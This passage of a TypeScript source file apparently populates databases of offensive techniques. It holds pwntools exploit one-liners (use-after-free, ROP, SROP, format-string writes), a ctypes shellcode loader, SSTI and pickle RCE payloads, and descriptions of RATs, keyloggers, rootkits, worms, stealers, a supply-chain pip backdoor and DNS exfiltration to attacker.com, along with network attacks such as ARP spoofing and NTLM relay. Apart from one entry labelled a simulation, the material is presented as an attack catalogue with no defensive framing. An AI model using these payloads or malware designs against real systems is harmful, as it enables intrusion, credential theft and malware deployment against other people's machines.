      'Exploit use-after-free vulnerability — free object, reallocate with controlled data at same address, trigger dangling pointer dereference for code execution',
    pythonCode:
      'alloc(0x80, "A"*0x80); alloc(0x80, "B"*0x80); free(0); alloc(0x80, p64(system_addr) + b"/bin/sh\\x00"); trigger_uaf()',
    libraries: ['pwntools'],
    difficulty: 'expert',
    platform: 'linux',
  })
  add({
    id: 'pyexp-int-overflow',
    name: 'Integer Overflow Exploitation',
    category: 'buffer_overflow',
    description:
      'Trigger integer overflow to bypass size checks — supply large size value that wraps to small allocation, then overflow the undersized buffer',
    pythonCode:
      'from pwn import *; p = process("./vuln"); size = 0xFFFFFFFF + 1 - 0x10; p.sendline(str(size)); p.sendline(b"A" * 0x100 + p64(win_addr))',
    libraries: ['pwntools'],
    difficulty: 'advanced',
    platform: 'cross_platform',
  })
  add({
    id: 'pyexp-ret2csu',
    name: 'Return-to-CSU ROP Technique',
    category: 'rop_chain',
    description:
      'Universal ROP gadget using __libc_csu_init — control rdi, rsi, rdx registers via csu gadgets when gadgets are scarce',
    pythonCode:
      'from pwn import *; rop = ROP(elf); csu_end = elf.sym["__libc_csu_init"] + 0x5a; csu_front = elf.sym["__libc_csu_init"] + 0x40; payload = flat(cyclic(offset), csu_end, 0, 0, 1, got_entry, arg1, arg2, arg3, csu_front)',
    libraries: ['pwntools', 'ropper'],
    difficulty: 'expert',
    platform: 'linux',
  })
  add({
    id: 'pyexp-srop',
    name: 'Sigreturn-Oriented Programming (SROP)',
    category: 'rop_chain',
    description:
      'Abuse sigreturn syscall to set all registers at once — craft fake sigframe on stack, invoke rt_sigreturn to load controlled register values',
    pythonCode:
      'from pwn import *; frame = SigreturnFrame(); frame.rax = constants.SYS_execve; frame.rdi = binsh_addr; frame.rsi = 0; frame.rdx = 0; frame.rsp = stack_addr; frame.rip = syscall_ret; payload = flat(cyclic(offset), sigreturn_gadget, frame)',
    libraries: ['pwntools'],
    difficulty: 'expert',
    platform: 'linux',
  })
  add({
    id: 'pyexp-stack-pivot',
    name: 'Stack Pivot Technique',
    category: 'rop_chain',
    description:
      'Pivot stack pointer to attacker-controlled memory — use xchg rax,rsp or leave;ret gadgets to redirect RSP to writable memory containing ROP chain',
    pythonCode:
      'from pwn import *; rop = ROP(elf); pivot_gadget = rop.find_gadget(["leave", "ret"])[0]; payload = flat(cyclic(offset - 8), controlled_buffer_addr, pivot_gadget)',
    libraries: ['pwntools', 'ropper'],
    difficulty: 'expert',
    platform: 'linux',
  })
  add({
    id: 'pyexp-www',
    name: 'Write-What-Where Exploitation',
    category: 'format_string',
    description:
      'Arbitrary write primitive exploitation — leverage format string or heap corruption to write controlled value at controlled address for GOT/hook overwrite',
    pythonCode:
      'from pwn import *; writes = {elf.got["printf"]: elf.sym["win"], elf.got["exit"]: elf.sym["main"]}; payload = fmtstr_payload(offset, writes, numbwritten=0)',
    libraries: ['pwntools'],
    difficulty: 'advanced',
    platform: 'linux',
  })
  add({
    id: 'pyexp-house-of-force',
    name: 'House of Force Heap Attack',
    category: 'heap_exploit',
    description:
      'Overwrite glibc wilderness (top chunk) size to achieve arbitrary allocation — requires heap overflow into top chunk metadata, then controlled malloc offset',
    pythonCode:
      'from pwn import *; overflow_topchunk(b"A"*chunk_size + p64(0xffffffffffffffff)); target_offset = target_addr - (heap_base + current_offset) - 0x20; alloc(target_offset); payload_chunk = alloc(0x20); write(payload_chunk, payload)',
    libraries: ['pwntools'],
    difficulty: 'expert',
    platform: 'linux',
  })
  add({
    id: 'pyexp-aslr-leak',
    name: 'ASLR Bypass via Information Leak',
    category: 'buffer_overflow',
    description:
      'Defeat ASLR by leaking runtime addresses — format string info leak, partial overwrite, use leaked libc address to compute system/bin_sh offsets',
    pythonCode:
      'from pwn import *; p.sendline(b"%p.%p.%p.%p.%p.%p.%p.%p"); leak = int(p.recvline().split(b".")[5], 16); libc_base = leak - libc.sym["__libc_start_main"] - 243; system = libc_base + libc.sym["system"]',
    libraries: ['pwntools'],
    difficulty: 'advanced',
    platform: 'linux',
  })
  add({
    id: 'pyexp-windows-shellcode',
    name: 'Windows Shellcode via ctypes',
    category: 'shellcode',
    description:
      'Execute custom shellcode on Windows using ctypes — VirtualAlloc RWX memory, copy shellcode, CreateThread to execute in current process',
    pythonCode:
      'import ctypes; shellcode = b"\\xfc\\x48\\x83..."; ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_void_p; ptr = ctypes.windll.kernel32.VirtualAlloc(0, len(shellcode), 0x3000, 0x40); ctypes.memmove(ptr, shellcode, len(shellcode)); ctypes.windll.kernel32.CreateThread(0, 0, ptr, 0, 0, 0)',
    libraries: ['ctypes'],
    difficulty: 'intermediate',
    platform: 'windows',
  })

  return db
}

function buildMalwareTechniques(): MalwareTechnique[] {
  const db: MalwareTechnique[] = []
  const add = (t: MalwareTechnique) => {
    db.push(t)
  }

  add({
    id: 'pymal-rat',
    name: 'Python Remote Access Trojan',
    category: 'rat',
    description:
      'Full-featured RAT with reverse shell, file transfer, screenshot, keylogging, and persistence — multi-threaded C2 communication',
    pythonApproach:
      'Socket-based reverse connection with command dispatcher, subprocess execution, file operations, and encrypted communication channel using AES',
    libraries: ['socket', 'subprocess', 'threading', 'pycryptodome'],
    capabilities: [
      'reverse_shell',
      'file_transfer',
      'screenshot',
      'keylog',
      'persistence',
      'process_list',
    ],
    evasionFeatures: ['encrypted_comms', 'anti_vm', 'process_injection'],
    difficulty: 'advanced',
  })
  add({
    id: 'pymal-keylogger',
    name: 'Python Keylogger',
    category: 'keylogger',
    description:
      'Cross-platform keylogger with pynput — captures keystrokes, clipboard, active window titles, and periodic exfiltration via email/HTTP',
    pythonApproach:
      'pynput.keyboard.Listener for keystroke capture, win32gui for active window tracking, periodic batched exfiltration with encryption',
    libraries: ['pynput', 'win32gui', 'smtplib'],
    capabilities: ['keystroke_capture', 'clipboard_monitor', 'window_tracking', 'timed_exfil'],
    evasionFeatures: ['startup_persistence', 'hidden_process', 'encrypted_logs'],
    difficulty: 'intermediate',
  })
  add({
    id: 'pymal-rootkit',
    name: 'Python User-Space Rootkit',
    category: 'rootkit',
    description:
      'LD_PRELOAD-based rootkit that hooks libc functions — hides files, processes, network connections from system tools',
    pythonApproach:
      'ctypes to load custom shared library via LD_PRELOAD, hooking readdir/stat/open to filter results, hiding by PID/filename patterns',
    libraries: ['ctypes', 'os'],
    capabilities: ['file_hiding', 'process_hiding', 'network_hiding', 'log_tampering'],
    evasionFeatures: ['ld_preload_hook', 'syscall_interception'],
    difficulty: 'expert',
  })
  add({
    id: 'pymal-backdoor',
    name: 'Python Encrypted Backdoor',
    category: 'backdoor',
    description:
      'Encrypted reverse shell backdoor with AES-256-CBC — survives reboots via cron/registry, multi-stage payload delivery',
    pythonApproach:
      'AES encrypted socket communication, subprocess shell execution, base64 encoded commands, multi-platform persistence installation',
    libraries: ['pycryptodome', 'socket', 'subprocess'],
    capabilities: ['encrypted_shell', 'file_operations', 'persistence', 'self_destruct'],
    evasionFeatures: ['aes_encryption', 'base64_encoding', 'anti_debug'],
    difficulty: 'advanced',
  })
  add({
    id: 'pymal-ransomware-sim',
    name: 'Ransomware Simulator',
    category: 'ransomware_sim',
    description:
      'Educational ransomware simulation — AES file encryption, RSA key exchange, file enumeration, extension targeting (SIMULATION ONLY)',
    pythonApproach:
      'Walk directory tree targeting extensions, generate per-file AES key, encrypt AES key with RSA public key, rename files with .encrypted extension',
    libraries: ['pycryptodome', 'os', 'glob'],
    capabilities: ['file_encryption', 'key_exchange', 'extension_filter', 'ransom_note'],
    evasionFeatures: ['in_memory_keys', 'secure_deletion'],
    difficulty: 'advanced',
  })
  add({
    id: 'pymal-worm',
    name: 'Python Network Worm',
    category: 'worm',
    description:
      'Self-propagating worm using SSH/SMB — scans subnet, attempts credential stuffing, copies and executes on new hosts',
    pythonApproach:
      'Subnet scanning with socket, paramiko SSH brute force or impacket SMB, SCP self-copy to new host, cron-based persistence on propagated hosts',
    libraries: ['paramiko', 'impacket', 'socket', 'threading'],
    capabilities: ['self_propagation', 'subnet_scan', 'credential_stuffing', 'auto_execution'],
    evasionFeatures: ['random_sleep', 'hostname_check', 'rate_limiting'],
    difficulty: 'expert',
  })
  add({
    id: 'pymal-dropper',
    name: 'Python Payload Dropper',
    category: 'dropper',
    description:
      'Multi-stage dropper — downloads encrypted payload, decrypts in memory, executes via process injection or exec()',
    pythonApproach:
      'HTTP/DNS download of encrypted blob, AES decrypt in memory, exec() or ctypes VirtualAlloc/WriteProcessMemory injection, cleanup',
    libraries: ['requests', 'pycryptodome', 'ctypes'],
    capabilities: ['staged_delivery', 'in_memory_exec', 'payload_encryption', 'dropper_cleanup'],
    evasionFeatures: ['memory_only', 'encrypted_payload', 'anti_sandbox'],
    difficulty: 'advanced',
  })
  add({
    id: 'pymal-stealer',
    name: 'Python Credential Stealer',
    category: 'stealer',
    description:
      'Browser credential and cookie extractor — SQLite DB parsing for Chrome/Firefox, DPAPI decryption, cookie extraction',
    pythonApproach:
      'Locate browser profile SQLite databases, extract login_data/cookies, decrypt with DPAPI (Windows) or NSS (Linux), exfiltrate via HTTP POST',
    libraries: ['sqlite3', 'ctypes', 'win32crypt'],
    capabilities: ['browser_passwords', 'browser_cookies', 'saved_forms', 'history_extraction'],
    evasionFeatures: ['in_memory_processing', 'encrypted_exfil'],
    difficulty: 'intermediate',
  })
  add({
    id: 'pymal-botnet',
    name: 'Python Botnet Agent',
    category: 'botnet_agent',
    description:
      'IRC/HTTP-based botnet agent — receives commands from C2, executes tasks, reports results, supports DDoS/spam/mining modules',
    pythonApproach:
      'IRC or HTTP polling C2 communication, command parsing and dispatch, module loading for attack types, health reporting',
    libraries: ['socket', 'irc', 'requests', 'threading'],
    capabilities: [
      'command_execution',
      'ddos_module',
      'spam_module',
      'update_module',
      'self_destruct',
    ],
    evasionFeatures: ['domain_generation', 'encrypted_c2', 'anti_analysis'],
    difficulty: 'advanced',
  })
  add({
    id: 'pymal-implant',
    name: 'Python Memory-Only Implant',
    category: 'implant',
    description:
      'Fileless implant that runs entirely in memory — no disk artifacts, code loaded via network, executes via exec/ctypes',
    pythonApproach:
      'Receive code over encrypted channel, compile and exec() in memory, never write to disk, use memfd_create on Linux for execution',
    libraries: ['ctypes', 'socket', 'code'],
    capabilities: ['fileless_execution', 'dynamic_loading', 'memory_only', 'reflective_load'],
    evasionFeatures: ['no_disk_write', 'encrypted_channel', 'memory_cleanup'],
    difficulty: 'expert',
  })

  // Additional malware techniques
  add({
    id: 'pymal-fileless-ps',
    name: 'Fileless PowerShell Loader',
    category: 'dropper',
    description:
      'Python-based fileless loader that generates and executes obfuscated PowerShell payloads in memory via subprocess — no script written to disk',
    pythonApproach:
      'Generate base64-encoded PowerShell commands, invoke via subprocess with -EncodedCommand flag, AMSI bypass prepended, download-cradle pattern',
    libraries: ['subprocess', 'base64', 'pycryptodome'],
    capabilities: ['fileless_exec', 'powershell_bypass', 'memory_only', 'encoded_commands'],
    evasionFeatures: ['amsi_bypass', 'base64_encoding', 'no_disk_artifact'],
    difficulty: 'advanced',
  })
  add({
    id: 'pymal-browser-ext',
    name: 'Browser Extension Malware',
    category: 'stealer',
    description:
      'Malicious browser extension generator — intercepts form submissions, modifies page content, exfiltrates cookies and saved credentials',
    pythonApproach:
      'Generate manifest.json and content scripts with Python templating, inject into Chrome/Firefox profile, content_scripts match all URLs for form interception',
    libraries: ['json', 'os', 'shutil', 'requests'],
    capabilities: ['form_interception', 'cookie_theft', 'page_modification', 'credential_harvest'],
    evasionFeatures: ['legitimate_extension_appearance', 'encrypted_exfil', 'minimal_permissions'],
    difficulty: 'intermediate',
  })
  add({
    id: 'pymal-supply-chain',
    name: 'Supply Chain Implant',
    category: 'backdoor',
    description:
      'Trojanized Python package that backdoors pip install — malicious setup.py with post-install hooks, typosquatting package names',
    pythonApproach:
      'Create package with malicious setup.py using cmdclass override, post_install hook downloads and executes payload, package mimics popular library name',
    libraries: ['setuptools', 'requests', 'subprocess'],
    capabilities: [
      'post_install_exec',
      'dependency_confusion',
      'typosquatting',
      'backdoor_injection',
    ],
    evasionFeatures: ['legitimate_package_structure', 'delayed_execution', 'environment_check'],
    difficulty: 'advanced',
  })
  add({
    id: 'pymal-cryptominer',
    name: 'Python Cryptominer',
    category: 'implant',
    description:
      'Stealthy cryptocurrency mining implant — throttles CPU usage to avoid detection, mines during idle periods, reports hashrate to pool',
    pythonApproach:
      'subprocess to run mining binary with throttled threads, psutil for CPU monitoring and idle detection, mining pool communication via stratum protocol',
    libraries: ['subprocess', 'psutil', 'socket', 'json'],
    capabilities: ['cpu_throttling', 'idle_detection', 'pool_communication', 'hashrate_reporting'],
    evasionFeatures: ['cpu_limiting', 'process_name_spoofing', 'idle_only_mining'],
    difficulty: 'intermediate',
  })
  add({
    id: 'pymal-clipboard',
    name: 'Clipboard Hijacker',
    category: 'stealer',
    description:
      'Monitor clipboard for cryptocurrency addresses and replace with attacker-controlled addresses — regex pattern matching for BTC, ETH, XMR formats',
    pythonApproach:
      'pyperclip/win32clipboard polling loop, regex match BTC (^[13][a-km-zA-HJ-NP-Z1-9]{25,34}$), ETH (^0x[a-fA-F0-9]{40}$), replace with attacker address',
    libraries: ['pyperclip', 'win32clipboard', 're', 'threading'],
    capabilities: [
      'clipboard_monitoring',
      'address_replacement',
      'multi_currency',
      'stealth_operation',
    ],
    evasionFeatures: ['low_cpu_usage', 'no_network_activity', 'process_hiding'],
    difficulty: 'beginner',
  })
  add({
    id: 'pymal-screen-cap',
    name: 'Screenshot Capture Agent',
    category: 'stealer',
    description:
      'Periodic screenshot capture and exfiltration — capture active window or full desktop at intervals, compress and encrypt before sending to C2',
    pythonApproach:
      'Pillow ImageGrab.grab() for full screen or pyautogui.screenshot(), compress with zlib, AES encrypt, batch upload via HTTPS POST to C2 endpoint',
    libraries: ['pillow', 'pycryptodome', 'requests'],
    capabilities: ['screenshot_capture', 'window_targeting', 'compression', 'encrypted_exfil'],
    evasionFeatures: ['interval_randomization', 'idle_detection', 'bandwidth_throttle'],
    difficulty: 'beginner',
  })
  add({
    id: 'pymal-dns-exfil',
    name: 'DNS Data Exfiltration Agent',
    category: 'stealer',
    description:
      'Exfiltrate data via DNS queries — encode stolen data as subdomain labels in DNS lookups, receive data via TXT record responses from attacker DNS server',
    pythonApproach:
      'Base32 encode data, split into 63-char labels, send as DNS A queries to attacker.com (data.chunk1.attacker.com), reassemble on attacker DNS server',
    libraries: ['dnspython', 'base64', 'socket'],
    capabilities: ['dns_exfiltration', 'chunked_transfer', 'bidirectional_dns', 'encoded_data'],
    evasionFeatures: ['dns_over_https', 'legitimate_looking_queries', 'slow_drip_exfil'],
    difficulty: 'advanced',
  })
  add({
    id: 'pymal-process-inject',
    name: 'Process Injection via ctypes',
    category: 'implant',
    description:
      'Inject shellcode or DLL into remote process — OpenProcess, VirtualAllocEx, WriteProcessMemory, CreateRemoteThread for code execution in target process',
    pythonApproach:
      'ctypes kernel32.OpenProcess(PROCESS_ALL_ACCESS), VirtualAllocEx for remote allocation, WriteProcessMemory to copy shellcode, CreateRemoteThread to execute',
    libraries: ['ctypes'],
    capabilities: ['remote_injection', 'dll_injection', 'shellcode_exec', 'thread_hijack'],
    evasionFeatures: ['legitimate_process_host', 'memory_only', 'no_disk_artifact'],
    difficulty: 'advanced',
  })
  add({
    id: 'pymal-worm-advanced',
    name: 'Advanced Network Worm Module',
    category: 'backdoor',
    description:
      'Self-propagating network worm — scan local subnet for vulnerable services, exploit and copy payload, establish persistence on new host, report to C2',
    pythonApproach:
      'python-nmap subnet scan for specific service versions, exploit known vulnerabilities (EternalBlue via impacket, SSH brute force), copy and execute payload on new host',
    libraries: ['python-nmap', 'impacket', 'paramiko', 'socket'],
    capabilities: ['network_scanning', 'auto_exploitation', 'self_propagation', 'lateral_movement'],
    evasionFeatures: ['slow_spread', 'target_filtering', 'encrypted_payload'],
    difficulty: 'expert',
  })
  add({
    id: 'pymal-persistence-kit',
    name: 'Multi-Method Persistence Kit',
    category: 'backdoor',
    description:
      'Comprehensive persistence toolkit — registry run keys, scheduled tasks, WMI event subscriptions, startup folder, services, DLL search order hijacking',
    pythonApproach:
      'ctypes/winreg for registry (HKCU\\Run), subprocess for schtasks, WMI for event subscriptions, shutil for startup folder copy, service installation via pywin32',
    libraries: ['ctypes', 'winreg', 'subprocess', 'os'],
    capabilities: [
      'registry_persistence',
      'scheduled_task',
      'wmi_subscription',
      'startup_folder',
      'service_creation',
    ],
    evasionFeatures: ['multiple_methods', 'redundancy', 'fileless_options'],
    difficulty: 'intermediate',
  })

  return db
}

function buildNetworkAttacks(): NetworkAttack[] {
  const db: NetworkAttack[] = []
  const add = (a: NetworkAttack) => {
    db.push(a)
  }

  add({
    id: 'pynet-arp-spoof',
    name: 'ARP Cache Poisoning',
    category: 'arp_spoof',
    description:
      'Send crafted ARP replies to associate attacker MAC with gateway IP — redirect traffic through attacker for MITM',
    pythonApproach:
      'Scapy ARP(op=2, pdst=target, hwdst=target_mac, psrc=gateway) sent in loop, enable IP forwarding, restore on exit',
    libraries: ['scapy'],
    targetLayer: 'layer2',
    difficulty: 'intermediate',
  })
  add({
    id: 'pynet-dns-spoof',
    name: 'DNS Spoofing Attack',
    category: 'dns_spoof',
    description:
      'Intercept DNS queries and respond with forged DNS replies pointing to attacker-controlled IP addresses',
    pythonApproach:
      'Scapy sniff DNS queries with BPF filter, craft DNS response with spoofed IP, use NetfilterQueue or raw sockets for inline modification',
    libraries: ['scapy', 'netfilterqueue'],
    targetLayer: 'layer7',
    difficulty: 'advanced',
  })
  add({
    id: 'pynet-mitm-proxy',
    name: 'Man-in-the-Middle Proxy',
    category: 'mitm',
    description:
      'Full MITM proxy that intercepts, modifies, and forwards HTTP/HTTPS traffic — SSL stripping, content injection, credential capture',
    pythonApproach:
      'mitmproxy scripting API with request/response hooks, SSL certificate generation, content injection via flow modification, credential extraction',
    libraries: ['mitmproxy', 'scapy'],
    targetLayer: 'layer7',
    difficulty: 'advanced',
  })
  add({
    id: 'pynet-wifi-deauth',
    name: 'WiFi Deauthentication Attack',
    category: 'wifi_attack',
    description:
      'Send 802.11 deauthentication frames to disconnect clients from access point — prerequisite for evil twin or handshake capture',
    pythonApproach:
      'Scapy Dot11Deauth with RadioTap header, target specific BSSID/client or broadcast, set interface to monitor mode first',
    libraries: ['scapy'],
    targetLayer: 'wireless',
    difficulty: 'intermediate',
  })
  add({
    id: 'pynet-wifi-evil-twin',
    name: 'Evil Twin Access Point',
    category: 'wifi_attack',
    description:
      'Create rogue access point mimicking legitimate WiFi — captive portal for credential harvesting, traffic interception',
    pythonApproach:
      'hostapd configuration via Python, dnsmasq for DHCP, iptables for routing, Flask captive portal for credential capture',
    libraries: ['scapy', 'flask', 'subprocess'],
    targetLayer: 'wireless',
    difficulty: 'advanced',
  })
  add({
    id: 'pynet-packet-inject',
    name: 'Raw Packet Injection',
    category: 'packet_injection',
    description:
      'Craft and inject arbitrary packets at any layer — TCP RST injection, SYN flooding, custom protocol packets',
    pythonApproach:
      'Scapy IP()/TCP()/Raw() packet construction, send() for layer 3, sendp() for layer 2, sr1() for send-receive pairs',
    libraries: ['scapy'],
    targetLayer: 'layer3',
    difficulty: 'intermediate',
  })
  add({
    id: 'pynet-syn-flood',
    name: 'SYN Flood Attack',
    category: 'dos',
    description:
      'TCP SYN flood denial of service — exhaust server connection table with half-open connections from spoofed IPs',
    pythonApproach:
      'Scapy IP(src=RandIP())/TCP(dport=target_port, flags="S") in rapid loop, randomize source IP and port',
    libraries: ['scapy'],
    targetLayer: 'layer4',
    difficulty: 'beginner',
  })
  add({
    id: 'pynet-dhcp-starve',
    name: 'DHCP Starvation Attack',
    category: 'dhcp_attack',
    description:
      'Exhaust DHCP server IP pool by requesting all available addresses with spoofed MAC addresses',
    pythonApproach:
      'Scapy DHCP Discover with random chaddr MAC in loop, consume entire IP pool, then deploy rogue DHCP server',
    libraries: ['scapy'],
    targetLayer: 'layer3',
    difficulty: 'intermediate',
  })
  add({
    id: 'pynet-vlan-hop',
    name: 'VLAN Hopping via DTP',
    category: 'vlan_hopping',
    description:
      'Exploit Cisco DTP to negotiate trunk port and access multiple VLANs — double-tagging for cross-VLAN access',
    pythonApproach:
      'Scapy Dot1Q double-tagging with native VLAN outer tag, target VLAN inner tag, or craft DTP frames to enable trunking',
    libraries: ['scapy'],
    targetLayer: 'layer2',
    difficulty: 'advanced',
  })
  add({
    id: 'pynet-sniff-creds',
    name: 'Credential Sniffing',
    category: 'sniffing',
    description:
      'Passive packet capture and credential extraction from unencrypted protocols — FTP, HTTP Basic, SMTP, POP3, Telnet',
    pythonApproach:
      'Scapy sniff() with BPF filter for specific ports, extract TCP payload, regex match for USER/PASS/Authorization headers',
    libraries: ['scapy'],
    targetLayer: 'layer7',
    difficulty: 'beginner',
  })
  add({
    id: 'pynet-icmp-tunnel',
    name: 'ICMP Tunneling',
    category: 'tunnel',
    description:
      'Encapsulate data within ICMP echo request/reply packets to bypass firewalls that allow ping',
    pythonApproach:
      'Scapy IP()/ICMP(type=8)/Raw(data) for client, sniff ICMP and extract payload on server, bidirectional data channel',
    libraries: ['scapy'],
    targetLayer: 'layer3',
    difficulty: 'advanced',
  })
  add({
    id: 'pynet-llmnr-poison',
    name: 'LLMNR/NBT-NS Poisoning',
    category: 'sniffing',
    description:
      'Respond to LLMNR/NBT-NS broadcast name resolution queries with attacker IP — capture NTLMv2 hashes',
    pythonApproach:
      'Sniff UDP 5355 (LLMNR) and 137 (NBT-NS), respond with attacker IP, relay captured NTLMv2 challenge/response to hashcat',
    libraries: ['scapy', 'impacket'],
    targetLayer: 'layer7',
    difficulty: 'intermediate',
  })

  // Additional network attacks
  add({
    id: 'pynet-bgp-hijack',
    name: 'BGP Hijacking Simulation',
    category: 'packet_injection',
    description:
      'Simulate BGP route hijacking by crafting BGP UPDATE messages — advertise more specific prefixes to redirect traffic through attacker AS',
    pythonApproach:
      'Scapy/ExaBGP for BGP session establishment and UPDATE message crafting, advertise more-specific /25 routes for target /24 prefix, monitor route propagation',
    libraries: ['scapy', 'exabgp'],
    targetLayer: 'layer3',
    difficulty: 'expert',
  })
  add({
    id: 'pynet-rogue-dhcp',
    name: 'Rogue DHCP Server',
    category: 'dhcp_attack',
    description:
      'Deploy rogue DHCP server to assign attacker-controlled DNS and gateway — redirect all client traffic through attacker for MITM',
    pythonApproach:
      'Scapy DHCP server responding to DISCOVER with attacker IP as gateway/DNS, race against legitimate DHCP server, IP pool management',
    libraries: ['scapy'],
    targetLayer: 'layer3',
    difficulty: 'intermediate',
  })
  add({
    id: 'pynet-dot1x-bypass',
    name: '802.1X NAC Bypass',
    category: 'vlan_hopping',
    description:
      'Bypass 802.1X port-based network access control — piggyback on authenticated session, MAC cloning, or exploit hub-mode ports',
    pythonApproach:
      'Monitor authenticated 802.1X session, clone authenticated MAC with macchanger, inject frames on authenticated port, or exploit multi-host auth mode',
    libraries: ['scapy', 'subprocess'],
    targetLayer: 'layer2',
    difficulty: 'expert',
  })
  add({
    id: 'pynet-ipv6-slaac',
    name: 'IPv6 SLAAC/RA Spoofing',
    category: 'packet_injection',
    description:
      'Send rogue Router Advertisements to become default IPv6 gateway — exploit SLAAC auto-configuration for MITM on dual-stack networks',
    pythonApproach:
      'Scapy IPv6/ICMPv6ND_RA with attacker prefix advertisement, set M and O flags, become default router for IPv6 traffic on dual-stack networks',
    libraries: ['scapy'],
    targetLayer: 'layer3',
    difficulty: 'advanced',
  })
  add({
    id: 'pynet-dns-tunnel',
    name: 'DNS Tunneling',
    category: 'tunnel',
    description:
      'Encapsulate arbitrary data within DNS queries and responses — bypass firewalls that permit DNS, create covert bidirectional data channel via DNS TXT/CNAME records',
    pythonApproach:
      'dnslib to craft DNS queries with base32-encoded data as subdomain labels, server decodes and responds via TXT records, reassemble chunks for full data transfer',
    libraries: ['dnspython', 'scapy'],
    targetLayer: 'layer7',
    difficulty: 'advanced',
  })
  add({
    id: 'pynet-ntlm-relay',
    name: 'NTLM Relay Attack',
    category: 'mitm',
    description:
      'Relay captured NTLM authentication to another service — intercept NTLM challenge/response and forward to target SMB/LDAP/HTTP for authenticated access',
    pythonApproach:
      'impacket ntlmrelayx.py for automatic relay, set up SMB/HTTP server to capture NTLM auth, relay to target service for command execution or credential dumping',
    libraries: ['impacket', 'scapy'],
    targetLayer: 'layer7',
    difficulty: 'advanced',
  })
  add({
    id: 'pynet-covert-channel',
    name: 'ICMP Covert Channel',
    category: 'tunnel',
    description:
      'Tunnel data through ICMP echo requests/replies — embed data in ICMP payload for covert communication through firewalls that permit ping',
    pythonApproach:
      'Scapy to craft ICMP echo requests with data in payload field, server responds with commands in ICMP echo replies, bidirectional covert channel via ping',
    libraries: ['scapy'],
    targetLayer: 'layer3',
    difficulty: 'intermediate',
  })
  add({
    id: 'pynet-smb-relay',
    name: 'SMB Relay and Credential Capture',
    category: 'sniffing',
    description:
      'Capture SMB credentials and relay authentication — Responder-style LLMNR/NBT-NS/mDNS poisoning combined with SMB credential capture and relay',
    pythonApproach:
      'Listen for LLMNR/NBT-NS broadcasts, respond with attacker IP, capture NTLMv2 hashes from SMB authentication, relay to other hosts or crack offline',
    libraries: ['impacket', 'scapy'],
    targetLayer: 'layer7',
    difficulty: 'intermediate',
  })
  add({
    id: 'pynet-ssl-strip',
    name: 'SSL Stripping Attack',
    category: 'mitm',
    description:
      'Downgrade HTTPS connections to HTTP — intercept HTTPS redirects and serve HTTP version to victim while maintaining HTTPS to server',
    pythonApproach:
      'ARP spoof to become gateway, iptables to redirect port 80 to mitmproxy, intercept 301/302 HTTPS redirects, rewrite to HTTP, maintain HTTPS upstream connection',
    libraries: ['mitmproxy', 'scapy'],
    targetLayer: 'layer7',
    difficulty: 'intermediate',
  })

  return db
}

function buildWebExploits(): WebExploit[] {
  const db: WebExploit[] = []
  const add = (e: WebExploit) => {
    db.push(e)
  }

  add({
    id: 'pyweb-sqli-auto',
    name: 'Automated SQL Injection',
    category: 'sqli',
    description:
      'Python SQLi scanner — detect injection points, determine DB type, extract schema, dump tables using UNION/blind/time-based techniques',
    pythonApproach:
      'requests with parameter fuzzing, detect SQL errors in response, automate UNION column enumeration, binary search for blind SQLi extraction',
    libraries: ['requests', 'sqlmap'],
    owaspCategory: 'A03:2021-Injection',
    difficulty: 'intermediate',
  })
  add({
    id: 'pyweb-sqli-second-order',
    name: 'Second-Order SQL Injection',
    category: 'sqli',
    description:
      'Inject payload that is stored and executed later in a different query context — bypasses input validation at injection point',
    pythonApproach:
      'Register/store malicious payload in first request, trigger execution via second endpoint that uses stored data unsafely in SQL',
    libraries: ['requests'],
    owaspCategory: 'A03:2021-Injection',
    difficulty: 'advanced',
  })
  add({
    id: 'pyweb-xss-scanner',
    name: 'XSS Vulnerability Scanner',
    category: 'xss',
    description:
      'Automated XSS detection using polyglot payloads, context-aware injection, DOM analysis, and WAF bypass techniques',
    pythonApproach:
      'Crawl target with requests/BeautifulSoup, inject XSS polyglots in all parameters, check reflection in response, test filter bypasses',
    libraries: ['requests', 'beautifulsoup4', 'selenium'],
    owaspCategory: 'A03:2021-Injection',
    difficulty: 'intermediate',
  })
  add({
    id: 'pyweb-ssrf-chain',
    name: 'SSRF Exploitation Chain',
    category: 'ssrf',
    description:
      'Chain SSRF to access internal services — cloud metadata, internal APIs, Redis/Memcached for RCE, port scanning behind firewall',
    pythonApproach:
      'requests with URL parameter injection pointing to internal IPs (127.0.0.1, 169.254.169.254), gopher:// protocol for Redis commands',
    libraries: ['requests'],
    owaspCategory: 'A10:2021-SSRF',
    difficulty: 'advanced',
  })
  add({
    id: 'pyweb-ssti',
    name: 'Server-Side Template Injection',
    category: 'ssti',
    description:
      'Detect and exploit SSTI in Jinja2/Mako/Tornado — achieve RCE via MRO traversal and __subclasses__ chain',
    pythonApproach:
      '{{7*7}} detection, then {{"".__class__.__mro__[1].__subclasses__()}} enumeration, find os._wrap_close or subprocess.Popen for RCE',
    libraries: ['requests'],
    owaspCategory: 'A03:2021-Injection',
    difficulty: 'advanced',
  })
  add({
    id: 'pyweb-lfi',
    name: 'LFI/RFI Exploitation',
    category: 'lfi_rfi',
    description:
      'Local/Remote File Inclusion via path traversal — read /etc/passwd, access log poisoning for RCE, PHP wrapper abuse',
    pythonApproach:
      'requests with ../../ traversal sequences, null byte injection, PHP wrapper (php://filter/convert.base64-encode), log poisoning via User-Agent',
    libraries: ['requests'],
    owaspCategory: 'A01:2021-Broken Access Control',
    difficulty: 'intermediate',
  })
  add({
    id: 'pyweb-rce-deser',
    name: 'Python Deserialization RCE',
    category: 'deserialization',
    description:
      'Exploit Python pickle/yaml deserialization — craft malicious pickle objects with __reduce__ for arbitrary code execution',
    pythonApproach:
      'class Exploit: def __reduce__(self): return (os.system, ("command",)); pickle.dumps(Exploit()). Also YAML: !!python/object/apply:os.system ["cmd"]',
    libraries: ['pickle', 'pyyaml'],
    owaspCategory: 'A08:2021-Software and Data Integrity',
    difficulty: 'advanced',
  })
  add({
    id: 'pyweb-jwt-attack',
    name: 'JWT Token Exploitation',
    category: 'auth_bypass',
    description:
      'JWT attacks — algorithm confusion (RS256→HS256), none algorithm, key brute force, claim manipulation for privilege escalation',
    pythonApproach:
      'Decode JWT (base64), change alg to none or HS256 with public key, modify claims (role/sub/admin), re-sign with jwt library',
    libraries: ['pyjwt', 'requests'],
    owaspCategory: 'A07:2021-Auth Failures',
    difficulty: 'intermediate',
  })
  add({
    id: 'pyweb-xxe',
    name: 'XXE Injection Automation',
    category: 'xxe',
    description:
      'Automated XXE exploitation — file read, SSRF via external entities, out-of-band data exfiltration, billion laughs DoS',
    pythonApproach:
